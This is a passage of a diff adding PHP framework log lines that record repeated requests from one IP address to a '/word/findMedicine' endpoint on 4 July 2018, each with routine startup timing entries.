+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:19+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000042s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:13:19+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:13:19+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+
+[ 2018-07-04T11:13:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000119s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000050s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000098s ]
+
+[ 2018-07-04T11:13:21+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:22+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000038s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+
+[ 2018-07-04T11:13:22+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+
+[ 2018-07-04T11:13:22+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:23+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:13:23+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000044s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+
+[ 2018-07-04T11:13:23+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:23+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000135s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:24+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:24+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:13:24+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:24+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000052s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000125s ]
+
+[ 2018-07-04T11:13:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000104s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+
+[ 2018-07-04T11:13:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+
+[ 2018-07-04T11:13:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:13:26+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:13:26+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000103s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000075s ]
+
+[ 2018-07-04T11:13:26+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000105s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:13:26+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000039s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:26+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:27+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:13:27+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:27+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000040s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:13:27+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:27+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:28+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000131s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000042s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000089s ]
+
+[ 2018-07-04T11:13:28+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+
+[ 2018-07-04T11:13:29+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:29+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:13:30+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000044s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+
+[ 2018-07-04T11:13:30+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000136s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:31+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000133s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:32+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:32+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:13:35+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:13:36+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:36+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:36+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:36+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000134s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000075s ]
+
+[ 2018-07-04T11:13:36+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000047s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000096s ]
+
+[ 2018-07-04T11:13:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000135s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000052s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000100s ]
+
+[ 2018-07-04T11:13:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000125s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000129s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000106s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000045s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+
+[ 2018-07-04T11:13:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000029s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000129s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:13:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+
+[ 2018-07-04T11:13:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:13:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:13:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:13:40+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:40+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000124s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000074s ]
+
+[ 2018-07-04T11:13:40+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:40+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+
+[ 2018-07-04T11:13:41+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:13:41+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
